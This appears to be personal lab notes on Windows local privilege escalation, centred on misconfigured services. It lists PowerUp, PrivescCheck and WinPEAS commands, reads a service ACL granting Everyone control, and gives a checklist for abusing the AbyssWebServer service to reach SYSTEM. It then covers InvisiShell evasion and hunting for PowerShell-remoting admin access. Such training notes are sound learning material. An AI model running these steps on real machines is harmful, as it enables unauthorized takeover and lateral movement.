- Missing patches
- Automated deployment and AutoLogon passwords in clear text
- AlwaysInstallElevated (Any user can run MSI as SYSTEM)
- Misconfigured Services
- DLL Hijacking and More
- NTLM relaying a.k.a Won't Fix

# Tools: PowerUp, Privesc

(Misconfigured Services is the main topic)



# Using PowerUp
1. # GET SERVICES WITH UNQUOTED PATHS AND A SPACE IN THEIR NAME
Get-ServiceUnquoted -Verbose

2. # GET SERVICES WHERE THE CURRENT USER CAN WRITE TO ITS BINARY PATH OR CHANGE ARGUMENTS TO BINARY
Get-ModifiableServiceFile -Verbose

3. # GET THE SERVICES WHOSE CONFIGURATION CURRENT USER CAN MODIFY
Get-ModifiableService -Verbose

#Watch the ACL of the service (abysswebserver)
sc.exe sdshow abysswebserver (abysswebserver = service) (sdshow = security descriptor show)
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

-> WD <- Identifier for everybody (anyone can configure abysswebserver on the studentvms).


# PowerUp
Invoke-AllChecks

# Privesc
Invoke-PrivEsc

#PrivescCheck
Invoke-Privesc check

#WinPEAS
winPEASx64.exe


# CHECKLIST

  Import-Module .\PowerUp.ps\
  Invoke-AllChecks
  
  Check StartName: "LocalSystem" -> Runs as Admin in the SYSTEM
  Check CanRestart: "True" -> Can Restart
  
  Check AbuseFunction: "InvokeServiceAbuse -Name 'AbyssWebServer'
  help InvokeServiceAbuse -examples
  
  AFTER GETING LOCAL ADMIN BECAUSE OF ABUSE FUNCTION:
  Get admin CMD
  InvisiShell
  Import Find-PSRemotingLocalAdminAccess.ps1
  Find-PSRemotingLocalAdminAccess -Verbose
  
  
  
  
  
  
